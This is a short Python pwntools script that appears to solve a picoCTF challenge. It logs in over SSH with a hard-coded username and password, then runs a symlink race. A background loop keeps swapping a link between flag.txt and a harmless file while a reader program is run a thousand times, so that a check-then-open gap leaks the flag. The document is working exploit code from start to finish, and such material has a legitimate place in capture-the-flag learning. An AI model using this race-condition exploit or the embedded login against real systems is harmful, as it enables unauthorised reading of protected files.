from pwn import *

PORT=52081
sh = ssh('ctf-player', 'saturn.picoctf.net', PORT, 'fd7746b4')
sh.run('touch myfile')
sh.run('while true; do ln -sf flag.txt flip; ln -sf myfile flip; done &')
sh.run('for i in {1..1000}; do ./txtreader flip; done')

sh.interactive()